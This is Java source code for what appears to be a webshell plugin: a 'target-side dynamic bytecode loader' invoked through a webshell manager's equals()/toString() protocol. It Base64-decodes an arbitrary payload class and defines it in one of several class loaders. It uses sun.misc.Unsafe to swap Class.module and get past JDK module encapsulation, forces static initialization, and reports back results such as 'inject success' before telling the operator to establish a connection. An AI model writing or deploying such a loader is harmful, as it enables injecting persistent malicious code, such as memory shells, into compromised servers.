import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 目标端动态字节码加载器（动态字节码加载）。
 *
 * <p>调用协议（与宿主 run 调用协议对齐）：
 * <pre>
 *   Class c = sessionMap.get(evalClassName);
 *   Object o = c.newInstance();
 *   o.equals(parameterMap);      // 本类在此完成全部工作，并把 byte[] 写入 parameterMap["result"]
 *   o.toString();                // 兜底：某些版本直接取 toString() 的返回值
 *   return (byte[]) parameterMap.get("result");
 * </pre>
 *
 * <p>相比旧实现增强：
 * <ul>
 *   <li>支持 4 种类加载器策略（临时子加载器 / TCCL / 系统 / 自动回退），默认临时子加载器；</li>
 *   <li>JDK9+ 通过 Unsafe 临时置换 Class.module 绕过 java.lang 的模块封装（否则 setAccessible 失败）；</li>
 *   <li>自动从 class 文件常量池解析真实类名，纠正输入错误，避免 "wrong name" 的 NoClassDefFoundError；</li>
 *   <li>同名类已存在时自动复用（LinkageError，含 Method.invoke 的 InvocationTargetException 剥壳）；</li>
 *   <li>defineClass 后强制初始化 + 尝试无参实例化，分别报告结果；</li>
 *   <li>失败时返回完整异常类型/消息/堆栈，不再吞异常；</li>
 *   <li>自带 Base64 解码（支持换行、URL-safe、缺失 padding），兼容低版本目标 JVM。</li>
 * </ul>
 */
public class LoaderUtil extends ClassLoader {

    public static final String VERSION = "2.0";

    private static final Charset UTF8 = Charset.forName("UTF-8");

    /** defineClass + 模块置换是全局状态，必须串行，避免并发执行互相踩踏。 */
    private static final Object DEFINE_LOCK = new Object();

    /** 防御性上限，避免误传超大 Base64 把目标打挂。 */
    private static final int MAX_CLASS_BYTES = 16 * 1024 * 1024;

    /** 宿主传入的 parameterMap（HashMap&lt;String, byte[]&gt; 语义，但保持 Object 值以兼容各版本）。 */
    private Map<String, Object> parameterMap;

    public LoaderUtil() {
        super();
    }

    public LoaderUtil(ClassLoader parent) {
        super(parent);
    }

    @Override
    public int hashCode() {
        // 仅仅为了满足 equals/hashCode 契约，加载器实例不参与散列表
        return System.identityHashCode(this);
    }

    // ------------------------------------------------------------------
    // 宿主反射协议入口
    // ------------------------------------------------------------------

    @Override
    @SuppressWarnings("unchecked")
    public boolean equals(Object obj) {
        Map<String, Object> params = null;
        String text;
        try {
            if (obj instanceof Map) {
                params = (Map<String, Object>) obj;
            }
            if (params == null) {
                text = buildFailure("参数类型错误",
                        "equals() 期望收到 Map/ReqParameter，实际为 "
                                + (obj == null ? "null" : obj.getClass().getName()),
                        null, 0L, null, null, null);
            } else {
                this.parameterMap = params;
                text = execute(params);
            }
        } catch (Throwable t) {
            text = buildFailure("加载器内部异常", String.valueOf(t), t, 0L, null, null, null);
        }

        // 无论成功失败都写回结果：宿主只在 equals 返回 true 时才继续读取 result。
        if (params != null) {
            try {
                params.put("result", text.getBytes(UTF8));
                params.put("loaderVersion", VERSION.getBytes(UTF8));
            } catch (Throwable ignored) {
                // 只读 Map 等极端情况下忽略
            }
        }
        return true;
    }

    @Override
    public String toString() {
        Map<String, Object> map = this.parameterMap;
        if (map == null) {
            return "RESULT:FAIL\nstatus=fail\nloaderVersion=" + VERSION
                    + "\nmessage=toString() 在 equals() 之前被调用，缺少执行参数\n";
        }
        Object result = map.get("result");
        if (result instanceof byte[]) {
            return new String((byte[]) result, UTF8);
        }
        return result == null ? "" : String.valueOf(result);
    }

    // ------------------------------------------------------------------
    // 主流程
    // ------------------------------------------------------------------

    private String execute(Map<String, Object> params) {
        long start = System.currentTimeMillis();

        byte[] classBytes;
        try {
            classBytes = extractClassBytes(params);
        } catch (Throwable t) {
            return buildFailure("字节码解析失败", String.valueOf(t), t, elapsed(start), null, null, null);
        }

        if (classBytes == null || classBytes.length == 0) {
            return buildFailure("参数缺失", "未找到 base64Code / classBytes 参数，或 Base64 解码结果为空",
                    null, elapsed(start), null, null, null);
        }
        if (classBytes.length > MAX_CLASS_BYTES) {
            return buildFailure("字节码过大", "class 文件 " + classBytes.length + " 字节，超过上限 "
                    + MAX_CLASS_BYTES + " 字节", null, elapsed(start), null, null, null);
        }
        if (!isClassFile(classBytes)) {
            return buildFailure("字节码无效", "解码结果不是合法 class 文件（magic != CAFEBABE），"
                    + "请确认传入的是 class 字节码的 Base64，而不是 jar/文本/加密数据",
                    null, elapsed(start), null, null, null);
        }

        String realName = parseClassName(classBytes);
        if (realName == null || realName.length() == 0) {
            return buildFailure("字节码无效", "无法从常量池解析类名，class 文件可能已损坏或经过裁剪",
                    null, elapsed(start), null, null, null);
        }

        String declaredName = getString(params.get("className"));
        if (declaredName == null) {
            declaredName = "";
        }
        declaredName = declaredName.trim();

        String note = null;
        if (declaredName.length() == 0) {
            note = "未提供类名，已从字节码自动解析为 " + realName;
        } else if (!declaredName.equals(realName)) {
            note = "输入类名 " + declaredName + " 与字节码内部类名不一致，已自动改用 " + realName;
        }

        int loaderType = getInt(getString(params.get("classloaderType")), 3);
        int payloadMajor = classMajorVersion(classBytes);
        List<Object[]> candidates = buildCandidates(loaderType);

        List<String> errors = new ArrayList<String>();
        String bestPartial = null;

        for (int i = 0; i < candidates.size(); i++) {
            Object[] candidate = candidates.get(i);
            ClassLoader target = (ClassLoader) candidate[0];
            String desc = (String) candidate[1];
            boolean owned = ((Boolean) candidate[2]).booleanValue();

            if (target == null) {
                errors.add(desc + " -> 不可用（null）");
                continue;
            }

            try {
                List<String> localNotes = new ArrayList<String>();
                Class<?> clazz = defineInto(target, owned, realName, classBytes, localNotes);
                String mergedNote = mergeNote(note, localNotes);

                boolean initialized = false;
                String initError = null;
                try {
                    // 关键：defineClass 不会执行静态代码块，必须显式初始化。
                    Class.forName(realName, true, target);
                    initialized = true;
                } catch (Throwable t) {
                    initError = describe(t);
                }

                boolean abstractType = clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers());
                boolean instantiated = false;
                Object instance = null;
                String instError = null;
                if (!abstractType) {
                    try {
                        Constructor<?> ctor = clazz.getDeclaredConstructor(new Class<?>[0]);
                        ctor.setAccessible(true);
                        instance = ctor.newInstance(new Object[0]);
                        instantiated = true;
                    } catch (NoSuchMethodException e) {
                        instError = "类中没有无参构造方法";
                    } catch (Throwable t) {
                        instError = describe(t);
                    }
                }

                // 部分目标类把加载逻辑放在构造/静态块里，
                // 并通过自身的 toString() 自报结果（例如 "inject success" / "context not found"），
                // 这里一并回显，便于判断是否真的生效。
                String payloadOutput = instance == null ? null : describePayloadOutput(clazz, instance);

                boolean ok = initialized && (instantiated || abstractType);
                boolean partial = !ok && (initialized || instantiated || abstractType);

                if (ok || partial) {
                    return buildResult(ok ? "success" : "partial", desc, realName,
                            classBytes.length, initialized, instantiated, abstractType,
                            initError, instError, payloadOutput, mergedNote, elapsed(start));
                }

                // 定义成功但初始化/实例化都失败：记录后继续尝试其它加载器
                if (bestPartial == null) {
                    bestPartial = buildResult("partial", desc, realName,
                            classBytes.length, initialized, instantiated, abstractType,
                            initError, instError, payloadOutput, mergedNote, elapsed(start));
                }
                errors.add(desc + " -> 已定义但不可用：" + firstLine(initError != null ? initError : instError));
            } catch (Throwable t) {
                errors.add(desc + " -> " + firstLine(describe(t)));
            }
        }

        if (bestPartial != null) {
            return bestPartial;
        }
        String detailText = join(errors);
        return buildFailure("所有类加载器策略均失败", hintForFailure(detailText, payloadMajor),
                null, elapsed(start), realName, detailText, note);
    }

    /**
     * 把「所有策略失败」的原始错误翻译成可执行提示。
     * 关键：区分「加载器自身版本」和「载荷 class 版本」——两者的处理方式完全不同。
     */
    private static String hintForFailure(String detail, int payloadMajor) {
        String text = detail == null ? "" : detail.toLowerCase();
        if (text.indexOf("unsupportedclassversionerror") >= 0
                || text.indexOf("unsupported major.minor version") >= 0) {
            int targetMax = targetClassVersion();
            String targetName = javaVersionName(targetMax);
            String payloadName = javaVersionName(payloadMajor);
            if (payloadMajor > targetMax) {
                return "载荷 class 的字节码版本高于目标 JVM：载荷是 major " + payloadMajor
                        + "（" + payloadName + "），而目标 JVM 只支持到 major " + targetMax
                        + "（" + targetName + "）。请用低版本 JDK 重新编译该载荷，"
                        + "或改用与目标 JVM 匹配的载荷";
            }
            return "字节码版本高于目标 JVM（目标 " + targetName + "，major " + targetMax
                    + "）。请确认载荷与加载器均按目标 JVM 支持的版本编译";
        }
        if (text.indexOf("inaccessibleobjectexception") >= 0
                || text.indexOf("does not \"opens java.lang\"") >= 0
                || text.indexOf("module") >= 0 && text.indexOf("denied") >= 0) {
            return "目标 JDK 的模块封装阻止了反射 defineClass。"
                    + "请改用「临时类加载器 Temp ClassLoader」或「自动回退」";
        }
        if (text.indexOf("securityexception") >= 0
                || text.indexOf("security manager") >= 0) {
            return "目标启用了 SecurityManager，禁止 defineClass。需要先处理安全管理器";
        }
        if (text.indexOf("classnotfoundexception") >= 0
                || text.indexOf("noclassdeffounderror") >= 0) {
            return "目标端缺少该 class 依赖，或类加载器看不到依赖包。"
                    + "请改用「临时类加载器 Temp ClassLoader」或检查依赖";
        }
        return "所有类加载器策略均失败，请查看 detail 字段中每条策略的具体异常；"
                + "可先改用「临时类加载器 Temp ClassLoader」重试";
    }

    // ------------------------------------------------------------------
    // 类加载器策略
    // ------------------------------------------------------------------

    private static List<Object[]> buildCandidates(int type) {
        List<Object[]> list = new ArrayList<Object[]>();
        ClassLoader tccl = Thread.currentThread().getContextClassLoader();
        ClassLoader system = ClassLoader.getSystemClassLoader();

        if (type == 0) {
            list.add(new Object[]{system, "系统类加载器 (SystemClassLoader)", Boolean.FALSE});
        } else if (type == 1) {
            list.add(new Object[]{tccl, "线程上下文类加载器 (TCCL)", Boolean.FALSE});
        } else if (type == 2) {
            list.add(new Object[]{new LoaderUtil(tccl),
                    "临时类加载器 (TCCL 子加载器)", Boolean.TRUE});
        } else {
            // 自动：子加载器最稳（不需要反射/模块绕过），失败再逐级回退
            list.add(new Object[]{new LoaderUtil(tccl),
                    "临时类加载器 (TCCL 子加载器)", Boolean.TRUE});
            if (tccl != null && tccl != system) {
                list.add(new Object[]{tccl, "线程上下文类加载器 (TCCL)", Boolean.FALSE});
            }
            list.add(new Object[]{system, "系统类加载器 (SystemClassLoader)", Boolean.FALSE});
        }
        return list;
    }

    private Class<?> defineInto(ClassLoader target, boolean owned, String name, byte[] bytes,
                                List<String> notes) throws Throwable {
        try {
            if (owned && target instanceof LoaderUtil) {
                // 子类可以直接调用继承来的 protected defineClass，无需反射、无需模块绕过
                return ((LoaderUtil) target).defineClass(name, bytes, 0, bytes.length);
            }
            return defineReflectively(target, name, bytes);
        } catch (LinkageError e) {
            // 同名类已定义：尽量复用，而不是直接失败
            Class<?> existing = null;
            try {
                existing = Class.forName(name, false, target);
            } catch (Throwable ignored) {
                // ignore
            }
            if (existing != null && existing.getClassLoader() == target) {
                notes.add("目标加载器中已存在同名类，已复用（如需重新加载请换类名或重启应用）");
                return existing;
            }
            throw e;
        }
    }

    private Class<?> defineReflectively(ClassLoader target, String name, byte[] bytes) throws Throwable {
        synchronized (DEFINE_LOCK) {
            Object originalModule = openModule(getClass(), ClassLoader.class);
            try {
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
                        new Class<?>[]{String.class, byte[].class, int.class, int.class});
                defineClass.setAccessible(true);
                try {
                    return (Class<?>) defineClass.invoke(target,
                            new Object[]{name, bytes, Integer.valueOf(0), Integer.valueOf(bytes.length)});
                } catch (InvocationTargetException e) {
                    // 反射调用会把 LinkageError 等包装一层，剥掉后才能被上层识别
                    throw e.getTargetException();
                }
            } finally {
                restoreModule(getClass(), originalModule);
            }
        }
    }

    /**
     * JDK9+：把 caller 类的 module 字段临时指向 target 所在的 module，
     * 使 setAccessible 的调用方检查通过；JDK8 返回 null（无需处理）。
     */
    private static Object openModule(Class<?> caller, Class<?> target) {
        try {
            Object unsafe = getUnsafe();
            if (unsafe == null) {
                return null;
            }
            Method getModule = Class.class.getMethod("getModule", new Class<?>[0]);
            Object callerModule = getModule.invoke(caller, new Object[0]);
            Object targetModule = getModule.invoke(target, new Object[0]);
            if (callerModule == targetModule) {
                return null;
            }

            long offset = moduleFieldOffset(unsafe);
            Method putObject = unsafe.getClass().getMethod("putObject",
                    new Class<?>[]{Object.class, long.class, Object.class});
            putObject.setAccessible(true);
            putObject.invoke(unsafe, new Object[]{caller, Long.valueOf(offset), targetModule});
            return callerModule;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void restoreModule(Class<?> caller, Object originalModule) {
        if (originalModule == null) {
            return;
        }
        try {
            Object unsafe = getUnsafe();
            if (unsafe == null) {
                return;
            }
            long offset = moduleFieldOffset(unsafe);
            Method putObject = unsafe.getClass().getMethod("putObject",
                    new Class<?>[]{Object.class, long.class, Object.class});
            putObject.setAccessible(true);
            putObject.invoke(unsafe, new Object[]{caller, Long.valueOf(offset), originalModule});
        } catch (Throwable ignored) {
            // ignore
        }
    }

    private static long moduleFieldOffset(Object unsafe) throws Exception {
        Field moduleField = Class.class.getDeclaredField("module");
        Method objectFieldOffset = unsafe.getClass().getMethod("objectFieldOffset",
                new Class<?>[]{Field.class});
        objectFieldOffset.setAccessible(true);
        return ((Long) objectFieldOffset.invoke(unsafe, new Object[]{moduleField})).longValue();
    }

    private static Object getUnsafe() {
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field theUnsafe = unsafeClass.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            return theUnsafe.get(null);
        } catch (Throwable ignored) {
            return null;
        }
    }

    // ------------------------------------------------------------------
    // 参数解析
    // ------------------------------------------------------------------

    private static byte[] extractClassBytes(Map<String, Object> params) {
        Object raw = params.get("classBytes");
        if (raw instanceof byte[]) {
            byte[] b = (byte[]) raw;
            if (isClassFile(b)) {
                return b;
            }
            byte[] decoded = decodeBase64(new String(b, UTF8));
            return decoded.length > 0 ? decoded : b;
        }

        Object base64 = params.get("base64Code");
        if (base64 instanceof byte[]) {
            byte[] b = (byte[]) base64;
            if (isClassFile(b)) {
                return b;
            }
            return decodeBase64(new String(b, UTF8));
        }
        if (base64 instanceof String) {
            return decodeBase64((String) base64);
        }
        return null;
    }

    private static String getString(Object value) {
        if (value == null) {
            return null;
        }
        if (value instanceof byte[]) {
            return new String((byte[]) value, UTF8);
        }
        return String.valueOf(value);
    }

    private static int getInt(String value, int defaultValue) {
        try {
            return Integer.parseInt(value.trim());
        } catch (Throwable ignored) {
            return defaultValue;
        }
    }

    // ------------------------------------------------------------------
    // Base64 / class 文件解析
    // ------------------------------------------------------------------

    private static byte[] decodeBase64(String text) {
        if (text == null) {
            return new byte[0];
        }
        StringBuilder sb = new StringBuilder(text.length());
        for (int i = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c == '-') {
                c = '+';
            } else if (c == '_') {
                c = '/';
            }
            if (c == '=' || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')
                    || (c >= '0' && c <= '9') || c == '+' || c == '/') {
                sb.append(c);
            }
            // 其余字符（换行、空格、引号等）直接忽略
        }

        int len = sb.length();
        if (len == 0) {
            return new byte[0];
        }
        while (len % 4 != 0) {
            sb.append('=');
            len++;
        }

        byte[] out = new byte[len / 4 * 3];
        int pos = 0;
        for (int i = 0; i < len; i += 4) {
            int value = 0;
            int pad = 0;
            for (int j = 0; j < 4; j++) {
                char c = sb.charAt(i + j);
                int digit;
                if (c == '=') {
                    digit = 0;
                    pad++;
                } else if (c >= 'A' && c <= 'Z') {
                    digit = c - 'A';
                } else if (c >= 'a' && c <= 'z') {
                    digit = c - 'a' + 26;
                } else if (c >= '0' && c <= '9') {
                    digit = c - '0' + 52;
                } else if (c == '+') {
                    digit = 62;
                } else if (c == '/') {
                    digit = 63;
                } else {
                    throw new IllegalArgumentException("非法 Base64 字符: " + c);
                }
                value = (value << 6) | digit;
            }
            out[pos++] = (byte) ((value >> 16) & 0xFF);
            if (pad < 2) {
                out[pos++] = (byte) ((value >> 8) & 0xFF);
            }
            if (pad < 1) {
                out[pos++] = (byte) (value & 0xFF);
            }
        }
        if (pos == out.length) {
            return out;
        }
        byte[] result = new byte[pos];
        System.arraycopy(out, 0, result, 0, pos);
        return result;
    }

    private static boolean isClassFile(byte[] b) {
        return b != null && b.length >= 10
                && (b[0] & 0xFF) == 0xCA && (b[1] & 0xFF) == 0xFE
                && (b[2] & 0xFF) == 0xBA && (b[3] & 0xFF) == 0xBE;
    }

    /** class 文件 major version（52 = Java 8）。 */
    private static int classMajorVersion(byte[] b) {
        if (b == null || b.length < 8) {
            return 0;
        }
        return ((b[6] & 0xFF) << 8) | (b[7] & 0xFF);
    }

    /** 当前 JVM 能加载的最高 class major version。 */
    private static int targetClassVersion() {
        try {
            return (int) Float.parseFloat(System.getProperty("java.class.version", "0"));
        } catch (Throwable ignored) {
            return 0;
        }
    }

    private static String javaVersionName(int major) {
        if (major <= 0) {
            return "未知";
        }
        switch (major) {
            case 45: return "Java 1.1";
            case 46: return "Java 1.2";
            case 47: return "Java 1.3";
            case 48: return "Java 1.4";
            case 49: return "Java 5";
            case 50: return "Java 6";
            case 51: return "Java 7";
            case 52: return "Java 8";
            default: return "Java " + (major - 44);
        }
    }

    /** 从常量池解析 this_class，返回点分形式的类名；失败返回 null。 */
    private static String parseClassName(byte[] b) {
        try {
            int cpCount = u2(b, 8);
            if (cpCount <= 1) {
                return null;
            }
            String[] utf8 = new String[cpCount];
            int[] classNameIndex = new int[cpCount];
            int p = 10;

            for (int i = 1; i < cpCount; i++) {
                int tag = b[p++] & 0xFF;
                switch (tag) {
                    case 1: { // Utf8
                        int len = u2(b, p);
                        p += 2;
                        if (p + len > b.length) {
                            return null;
                        }
                        utf8[i] = new String(b, p, len, UTF8);
                        p += len;
                        break;
                    }
                    case 3: // Integer
                    case 4: // Float
                        p += 4;
                        break;
                    case 5: // Long
                    case 6: // Double
                        p += 8;
                        i++; // 占两个槽位
                        break;
                    case 7: // Class
                        classNameIndex[i] = u2(b, p);
                        p += 2;
                        break;
                    case 8: // String
                    case 16: // MethodType
                    case 19: // Module
                    case 20: // Package
                        p += 2;
                        break;
                    case 9: // Fieldref
                    case 10: // Methodref
                    case 11: // InterfaceMethodref
                    case 12: // NameAndType
                    case 17: // Dynamic
                    case 18: // InvokeDynamic
                        p += 4;
                        break;
                    case 15: // MethodHandle
                        p += 3;
                        break;
                    default:
                        return null;
                }
                if (p > b.length) {
                    return null;
                }
            }

            p += 2; // access_flags
            int thisClass = u2(b, p);
            if (thisClass <= 0 || thisClass >= cpCount) {
                return null;
            }
            int nameIndex = classNameIndex[thisClass];
            if (nameIndex <= 0 || nameIndex >= cpCount) {
                return null;
            }
            String internalName = utf8[nameIndex];
            if (internalName == null || internalName.length() == 0) {
                return null;
            }
            return internalName.replace('/', '.');
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static int u2(byte[] b, int offset) {
        return ((b[offset] & 0xFF) << 8) | (b[offset + 1] & 0xFF);
    }

    // ------------------------------------------------------------------
    // 结果拼装
    // ------------------------------------------------------------------

    private static String buildResult(String status, String loaderDesc, String className, int size,
                                      boolean initialized, boolean instantiated, boolean abstractType,
                                      String initError, String instError, String payloadOutput,
                                      String note, long ms) {
        StringBuilder sb = new StringBuilder();
        sb.append("RESULT:").append(status.toUpperCase()).append('\n');
        sb.append("status=").append(status).append('\n');
        sb.append("loaderVersion=").append(VERSION).append('\n');
        sb.append("jvm=").append(oneLine(System.getProperty("java.version")))
                .append(" / classVersion=").append(oneLine(System.getProperty("java.class.version"))).append('\n');
        sb.append("jvmMaxSupported=").append(javaVersionName(targetClassVersion()))
                .append(" (major ").append(targetClassVersion()).append(")").append('\n');
        sb.append("loader=").append(oneLine(loaderDesc)).append('\n');
        sb.append("className=").append(oneLine(className)).append('\n');
        sb.append("classBytes=").append(size).append('\n');
        sb.append("initialized=").append(initialized).append('\n');
        sb.append("instantiated=").append(instantiated).append('\n');
        sb.append("abstractType=").append(abstractType).append('\n');
        sb.append("elapsedMs=").append(ms).append('\n');
        if (note != null) {
            sb.append("note=").append(oneLine(note)).append('\n');
        }
        if (initError != null) {
            sb.append("initError=").append(oneLine(initError)).append('\n');
        }
        if (instError != null) {
            sb.append("instantiateError=").append(oneLine(instError)).append('\n');
        }
        if (payloadOutput != null) {
            sb.append("payloadOutput=").append(oneLine(payloadOutput)).append('\n');
        }
        sb.append("message=").append("success".equals(status)
                ? "类已定义并初始化，可尝试建立连接"
                : "类已定义，但初始化/实例化未完成，请检查 initError/instantiateError").append('\n');
        return sb.toString();
    }

    private static String buildFailure(String errorType, String message, Throwable t, long ms,
                                       String className, String detail, String note) {
        StringBuilder sb = new StringBuilder();
        sb.append("RESULT:FAIL\n");
        sb.append("status=fail\n");
        sb.append("loaderVersion=").append(VERSION).append('\n');
        sb.append("jvm=").append(oneLine(System.getProperty("java.version")))
                .append(" / classVersion=").append(oneLine(System.getProperty("java.class.version"))).append('\n');
        sb.append("jvmMaxSupported=").append(javaVersionName(targetClassVersion()))
                .append(" (major ").append(targetClassVersion()).append(")").append('\n');
        if (className != null) {
            sb.append("className=").append(oneLine(className)).append('\n');
        }
        sb.append("elapsedMs=").append(ms).append('\n');
        sb.append("errorType=").append(oneLine(errorType)).append('\n');
        sb.append("message=").append(oneLine(message)).append('\n');
        if (note != null) {
            sb.append("note=").append(oneLine(note)).append('\n');
        }
        if (detail != null) {
            sb.append("detail=").append(oneLine(detail)).append('\n');
        }
        if (t != null) {
            sb.append("stacktrace:\n").append(describe(t)).append('\n');
        }
        return sb.toString();
    }

    private static String mergeNote(String note, List<String> extra) {
        StringBuilder sb = new StringBuilder();
        if (note != null && note.length() > 0) {
            sb.append(note);
        }
        for (int i = 0; i < extra.size(); i++) {
            if (sb.length() > 0) {
                sb.append("；");
            }
            sb.append(extra.get(i));
        }
        return sb.length() == 0 ? null : sb.toString();
    }

    /**
     * 仅当类自己实现了 toString() 时才调用（Object 的默认实现没有信息量），
     * 用于回显目标类在构造/静态块中完成加载后的自报结果。
     * 方法从实例自身的类解析，避免出现 "object is not an instance of declaring class"。
     */
    private static String describePayloadOutput(Class<?> clazz, Object instance) {
        try {
            Method toString = clazz.getMethod("toString", new Class<?>[0]);
            if (toString.getDeclaringClass() == Object.class) {
                return null;
            }
            Object value = toString.invoke(instance, new Object[0]);
            if (value == null) {
                return null;
            }
            String text = String.valueOf(value);
            if (text.length() == 0) {
                return null;
            }
            if (text.length() > 400) {
                text = text.substring(0, 400) + "...(truncated)";
            }
            return text;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String describe(Throwable t) {
        try {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            t.printStackTrace(pw);
            pw.flush();
            return sw.toString();
        } catch (Throwable ignored) {
            return String.valueOf(t);
        }
    }

    private static String firstLine(String text) {
        if (text == null) {
            return "";
        }
        int index = text.indexOf('\n');
        String line = index >= 0 ? text.substring(0, index) : text;
        return line.trim();
    }

    private static String oneLine(String text) {
        if (text == null) {
            return "";
        }
        return text.replace('\r', ' ').replace('\n', ' ').trim();
    }

    private static String join(List<String> list) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < list.size(); i++) {
            if (i > 0) {
                sb.append(" || ");
            }
            sb.append(list.get(i));
        }
        return sb.toString();
    }

    private static long elapsed(long start) {
        return System.currentTimeMillis() - start;
    }
}
